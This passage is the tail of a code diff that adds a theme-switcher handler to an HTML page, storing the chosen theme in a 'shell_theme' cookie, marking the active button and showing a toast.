+        document.cookie = 'shell_theme=' + t + ';path=/;max-age=31536000;SameSite=Strict';
+        document.querySelectorAll('.theme-btn').forEach(x => x.classList.remove('active'));
+        b.classList.add('active');
+        showToast('Theme: ' + t.toUpperCase());
+    });
+});
+</script>
+</body>
+</html>
